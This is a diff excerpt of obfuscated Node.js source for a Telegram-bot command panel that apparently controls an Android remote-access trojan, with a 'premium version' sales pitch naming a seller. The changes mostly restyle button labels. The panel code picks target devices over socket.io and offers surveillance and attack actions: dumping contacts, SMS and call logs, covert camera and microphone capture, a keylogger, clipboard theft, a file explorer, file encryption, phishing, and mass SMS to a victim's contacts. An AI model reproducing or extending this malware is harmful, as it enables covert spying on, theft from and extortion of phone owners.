                                 bot.sendMessage(data.id, "<b>💎 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 — contact <b>Romeo Uchiha</b> to buy</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
-                                    'keyboard': [["📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴", "⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴"], ["ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴"]],
+                                    'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
                                     'resize_keyboard': true
                                   }
                                 });
                               }
-                              if (_0xdbde0c.text === "🖼️ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 🔴") {
+                              if (_0xdbde0c.text === "<b>🖼️ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 🔴</b>") {
                                 bot.sendMessage(data.id, "<b>💎 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 — contact <b>Romeo Uchiha</b> to buy</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
-                                    'keyboard': [["📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴", "⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴"], ["ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴"]],
+                                    'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
                                     'resize_keyboard': true
                                   }
                                 });
                               }
-                              if (_0xdbde0c.text === "🔒 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 🔴") {
+                              if (_0xdbde0c.text === "<b>🔒 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 🔴</b>") {
                                 bot.sendMessage(data.id, "<b>💎 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 — contact <b>Romeo Uchiha</b> to buy</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
-                                    'keyboard': [["📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴", "⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴"], ["ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴"]],
+                                    'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
                                     'resize_keyboard': true
                                   }
                                 });
                               }
-                              if (_0xdbde0c.text === "🔓 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 🔴") {
+                              if (_0xdbde0c.text === "<b>🔓 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 🔴</b>") {
                                 bot.sendMessage(data.id, "<b>💎 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 — contact <b>Romeo Uchiha</b> to buy</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
-                                    'keyboard': [["📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴", "⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴"], ["ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴"]],
+                                    'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
                                     'resize_keyboard': true
                                   }
                                 });
                               }
-                              if (_0xdbde0c.text === "🎤 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 🔴") {
+                              if (_0xdbde0c.text === "<b>🎤 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 🔴</b>") {
                                 appData.set("currentAction", 'microphoneDuration');
                                 bot.sendMessage(data.id, "<b>🎤 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚖𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 𝚛𝚎𝚌𝚘𝚛𝚍𝚒𝚗𝚐 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜</b>\n\n", {
                                   'parse_mode': 'HTML',
                                   'reply_markup': {
-                                    'keyboard': [["❌ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 🔴"]],
+                                    'keyboard': [["<b>❌ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 🔴</b>"]],
                                     'resize_keyboard': true,
                                     'one_time_keyboard': true
                                   }
                                 });
                               }
-                              if (_0xdbde0c.text === "🔔 𝚃𝚘𝚊𝚜𝚝 🔴") {
+                              if (_0xdbde0c.text === "<b>🔔 𝚃𝚘𝚊𝚜𝚝 🔴</b>") {
                                 appData.set("currentAction", "toastText");
                                 bot.sendMessage(data.id, "<b>🔔 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚖𝚎𝚜𝚜𝚊𝚐𝚎 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚒𝚗 𝚝𝚘𝚊𝚜𝚝 𝚋𝚘𝚡</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
-                                    'keyboard': [["❌ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 🔴"]],
+                                    'keyboard': [["<b>❌ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 🔴</b>"]],
                                     'resize_keyboard': true,
                                     'one_time_keyboard': true
                                   }
                                 });
                               }
-                              if (_0xdbde0c.text === "📤 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 🔴") {
+                              if (_0xdbde0c.text === "<b>📤 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 🔴</b>") {
                                 appData.set("currentAction", "smsNumber");
                                 bot.sendMessage(data.id, "<b>📤 𝙴𝚗𝚝𝚎𝚛 𝚊 𝚙𝚑𝚘𝚗𝚎 𝚗𝚞𝚖𝚋𝚎𝚛 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚂𝙼𝚂</b>\n\n", {
                                   'parse_mode': 'HTML',
                                   'reply_markup': {
-                                    'keyboard': [["❌ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 🔴"]],
+                                    'keyboard': [["<b>❌ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 🔴</b>"]],
                                     'resize_keyboard': true,
                                     'one_time_keyboard': true
                                   }
                                 });
                               }
-                              if (_0xdbde0c.text === "📳 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 🔴") {
+                              if (_0xdbde0c.text === "<b>📳 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 🔴</b>") {
                                 appData.set("currentAction", "vibrateDuration");
                                 bot.sendMessage(data.id, "<b>📳 𝙴𝚗𝚝𝚎𝚛 𝚝𝚑𝚎 𝚍𝚞𝚛𝚊𝚝𝚒𝚘𝚗 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚑𝚎 𝚍𝚎𝚟𝚒𝚌𝚎 𝚝𝚘 𝚟𝚒𝚋𝚛𝚊𝚝𝚎 𝚒𝚗 𝚜𝚎𝚌𝚘𝚗𝚍𝚜</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
-                                    'keyboard': [["❌ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 🔴"]],
+                                    'keyboard': [["<b>❌ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 🔴</b>"]],
                                     'resize_keyboard': true,
                                     'one_time_keyboard': true
                                   }
                                 });
                               }
-                              if (_0xdbde0c.text === "📨 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴") {
+                              if (_0xdbde0c.text === "<b>📨 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴</b>") {
                                 appData.set("currentAction", "textToAllContacts");
                                 bot.sendMessage(data.id, "<b>📨 𝙴𝚗𝚝𝚎𝚛 𝚝𝚎𝚡𝚝 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚜𝚎𝚗𝚍 𝚝𝚘 𝚊𝚕𝚕 𝚝𝚊𝚛𝚐𝚎𝚝 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
-                                    'keyboard': [["❌ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 🔴"]],
+                                    'keyboard': [["<b>❌ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 🔴</b>"]],
                                     'resize_keyboard': true,
                                     'one_time_keyboard': true
                                   }
                                 });
                               }
-                              if (_0xdbde0c.text === "📲 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 🔴") {
+                              if (_0xdbde0c.text === "<b>📲 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 🔴</b>") {
                                 appData.set("currentAction", "notificationText");
                                 bot.sendMessage(data.id, "<b>📲 𝙴𝚗𝚝𝚎𝚛 𝚝𝚎𝚡𝚝 𝚝𝚑𝚊𝚝 𝚢𝚘𝚞 𝚠𝚊𝚗𝚝 𝚝𝚘 𝚊𝚙𝚙𝚎𝚊𝚛 𝚊𝚜 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
-                                    'keyboard': [["❌ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 🔴"]],
+                                    'keyboard': [["<b>❌ 𝙲𝚊𝚗𝚌𝚎𝚕 𝚊𝚌𝚝𝚒𝚘𝚗 🔴</b>"]],
                                     'resize_keyboard': true,
                                     'one_time_keyboard': true
                                   }
                                 });
                               }
-                              if (_0xdbde0c.text === "🌐 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 🔴") {
+                              if (_0xdbde0c.text === "<b>🌐 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 🔴</b>") {
                                 bot.sendMessage(data.id, "<b>💎 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 — contact <b>Romeo Uchiha</b> to buy</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
-                                    'keyboard': [["📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴", "⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴"], ["ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴"]],
+                                    'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
                                     'resize_keyboard': true
                                   }
                                 });
                               }
-                              if (_0xdbde0c.text === "🎣 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 🔴") {
+                              if (_0xdbde0c.text === "<b>🎣 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 🔴</b>") {
                                 bot.sendMessage(data.id, "<b>💎 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 — contact <b>Romeo Uchiha</b> to buy</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
-                                    'keyboard': [["📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴", "⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴"], ["ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴"]],
+                                    'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
                                     'resize_keyboard': true
                                   }
                                 });
                               }
-                              if (_0xdbde0c.text === "▶️ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 🔴") {
+                              if (_0xdbde0c.text === "<b>▶️ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 🔴</b>") {
                                 bot.sendMessage(data.id, "<b>💎 𝚃𝚑𝚒𝚜 𝚘𝚙𝚝𝚒𝚘𝚗 𝚒𝚜 𝚘𝚗𝚕𝚢 𝚊𝚟𝚒𝚕𝚒𝚋𝚕𝚎 𝚘𝚗 𝚙𝚛𝚎𝚖𝚒𝚞𝚖 𝚟𝚎𝚛𝚜𝚒𝚘𝚗 — contact <b>Romeo Uchiha</b> to buy</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
-                                    'keyboard': [["📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴", "⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴"], ["ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴"]],
+                                    'keyboard': [["<b>📱 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 🔴</b>", "<b>⚙️ 𝙰𝚌𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>ℹ️ 𝙰𝚋𝚘𝚞𝚝 𝚞𝚜 🔴</b>"]],
                                     'resize_keyboard': true
                                   }
                                 });
                               }
                             } else {
                               io.sockets.sockets.forEach((_0x22a16b, _0x30e015, _0x5acd93) => {
-                                if (_0xdbde0c.text === _0x22a16b.model) {
+                                if (_0xdbde0c.text === `<b>${_0x22a16b.model}</b>`) {
                                   appData.set("currentTarget", _0x30e015);
                                   bot.sendMessage(data.id, "<b>⚙️ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 " + _0x22a16b.model + "</b>\n\n", {
                                     'parse_mode': "HTML",
                                     'reply_markup': {
-                                      'keyboard': [["📇 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴", "💬 𝚂𝙼𝚂 🔴"], ["📞 𝙲𝚊𝚕𝚕𝚜 🔴", "📱 𝙰𝚙𝚙𝚜 🔴"], ["📸 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 🔴", "🤳 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 🔴"], ["🎤 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 🔴", "📋 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 🔴"], ["🖼️ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 🔴", "🔔 𝚃𝚘𝚊𝚜𝚝 🔴"], ["📤 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 🔴", "📳 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 🔴"], ["▶️ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 🔴", "⏹️ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 🔴"], ["⌨️ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 🔴", "🔕 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 🔴"], ["📁 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 🔴", "🖼️ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 🔴"], ["🔒 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 🔴", "🔓 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 🔴"], ["🌐 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 🔴", "🎣 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 🔴"], ["📨 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴"], ["📲 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 🔴"], ["🔙 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 🔴"]],
+                                      'keyboard': [["<b>📇 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴</b>", "<b>💬 𝚂𝙼𝚂 🔴</b>"], ["<b>📞 𝙲𝚊𝚕𝚕𝚜 🔴</b>", "<b>📱 𝙰𝚙𝚙𝚜 🔴</b>"], ["<b>📸 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 🔴</b>", "<b>🤳 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 🔴</b>"], ["<b>🎤 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 🔴</b>", "<b>📋 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 🔴</b>"], ["<b>🖼️ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 🔴</b>", "<b>🔔 𝚃𝚘𝚊𝚜𝚝 🔴</b>"], ["<b>📤 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 🔴</b>", "<b>📳 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 🔴</b>"], ["<b>▶️ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 🔴</b>", "<b>⏹️ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 🔴</b>"], ["<b>⌨️ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 🔴</b>", "<b>🔕 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 🔴</b>"], ["<b>📁 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 🔴</b>", "<b>🖼️ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 🔴</b>"], ["<b>🔒 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 🔴</b>", "<b>🔓 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 🔴</b>"], ["<b>🌐 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 🔴</b>", "<b>🎣 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 🔴</b>"], ["<b>📨 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴</b>"], ["<b>📲 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>🔙 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 🔴</b>"]],
                                       'resize_keyboard': true,
                                       'one_time_keyboard': true
                                     }
                                   });
                                 }
                               });
-                              if (_0xdbde0c.text == "🌐 𝙰𝚕𝚕 🔴") {
+                              if (_0xdbde0c.text == "<b>🌐 𝙰𝚕𝚕 🔴</b>") {
                                 appData.set("currentTarget", "all");
                                 bot.sendMessage(data.id, "<b>⚙️ 𝚂𝚎𝚕𝚎𝚌𝚝 𝚊𝚌𝚝𝚒𝚘𝚗 𝚝𝚘 𝚙𝚎𝚛𝚏𝚘𝚛𝚖 𝚏𝚘𝚛 𝚊𝚕𝚕 𝚊𝚟𝚊𝚒𝚕𝚊𝚋𝚕𝚎 𝚍𝚎𝚟𝚒𝚌𝚎𝚜</b>\n\n", {
                                   'parse_mode': "HTML",
                                   'reply_markup': {
-                                    'keyboard': [["📇 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴", "💬 𝚂𝙼𝚂 🔴"], ["📞 𝙲𝚊𝚕𝚕𝚜 🔴", "📱 𝙰𝚙𝚙𝚜 🔴"], ["📸 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 🔴", "🤳 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 🔴"], ["🎤 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 🔴", "📋 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 🔴"], ["🖼️ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 🔴", "🔔 𝚃𝚘𝚊𝚜𝚝 🔴"], ["📤 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 🔴", "📳 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 🔴"], ["▶️ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 🔴", "⏹️ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 🔴"], ["⌨️ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 🔴", "🔕 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 🔴"], ["📁 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 🔴", "🖼️ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 🔴"], ["🔒 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 🔴", "🔓 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 🔴"], ["🌐 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 🔴", "🎣 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 🔴"], ["📨 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴"], ["📲 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 🔴"], ["🔙 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 🔴"]],
+                                    'keyboard': [["<b>📇 𝙲𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴</b>", "<b>💬 𝚂𝙼𝚂 🔴</b>"], ["<b>📞 𝙲𝚊𝚕𝚕𝚜 🔴</b>", "<b>📱 𝙰𝚙𝚙𝚜 🔴</b>"], ["<b>📸 𝙼𝚊𝚒𝚗 𝚌𝚊𝚖𝚎𝚛𝚊 🔴</b>", "<b>🤳 𝚂𝚎𝚕𝚏𝚒𝚎 𝙲𝚊𝚖𝚎𝚛𝚊 🔴</b>"], ["<b>🎤 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 🔴</b>", "<b>📋 𝙲𝚕𝚒𝚙𝚋𝚘𝚊𝚛𝚍 🔴</b>"], ["<b>🖼️ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 🔴</b>", "<b>🔔 𝚃𝚘𝚊𝚜𝚝 🔴</b>"], ["<b>📤 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 🔴</b>", "<b>📳 𝚅𝚒𝚋𝚛𝚊𝚝𝚎 🔴</b>"], ["<b>▶️ 𝙿𝚕𝚊𝚢 𝚊𝚞𝚍𝚒𝚘 🔴</b>", "<b>⏹️ 𝚂𝚝𝚘𝚙 𝙰𝚞𝚍𝚒𝚘 🔴</b>"], ["<b>⌨️ 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙽 🔴</b>", "<b>🔕 𝙺𝚎𝚢𝚕𝚘𝚐𝚐𝚎𝚛 𝙾𝙵𝙵 🔴</b>"], ["<b>📁 𝙵𝚒𝚕𝚎 𝚎𝚡𝚙𝚕𝚘𝚛𝚎𝚛 🔴</b>", "<b>🖼️ 𝙶𝚊𝚕𝚕𝚎𝚛𝚢 🔴</b>"], ["<b>🔒 𝙴𝚗𝚌𝚛𝚢𝚙𝚝 🔴</b>", "<b>🔓 𝙳𝚎𝚌𝚛𝚢𝚙𝚝 🔴</b>"], ["<b>🌐 𝙾𝚙𝚎𝚗 𝚄𝚁𝙻 🔴</b>", "<b>🎣 𝙿𝚑𝚒𝚜𝚑𝚒𝚗𝚐 🔴</b>"], ["<b>📨 𝚂𝚎𝚗𝚍 𝚂𝙼𝚂 𝚝𝚘 𝚊𝚕𝚕 𝚌𝚘𝚗𝚝𝚊𝚌𝚝𝚜 🔴</b>"], ["<b>📲 𝙿𝚘𝚙 𝚗𝚘𝚝𝚒𝚏𝚒𝚌𝚊𝚝𝚒𝚘𝚗 🔴</b>"], ["<b>🔙 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 🔴</b>"]],
                                     'resize_keyboard': true,
                                     'one_time_keyboard': true
                                   }
@@ -821,7 +843,9 @@ setInterval(() => {
   });
 }, 0x1388);
 setInterval(() => {
-  https.get(data.host, _0x9df260 => {}).on("error", _0x26bc04 => {});
+  if (data.host) {
+     https.get(data.host, _0x9df260 => {}).on("error", _0x26bc04 => {});
+  }
 }, 0x75300);
 server.listen(process.env.PORT || 0xbb8, () => {
   console.log("listening on port 3000");
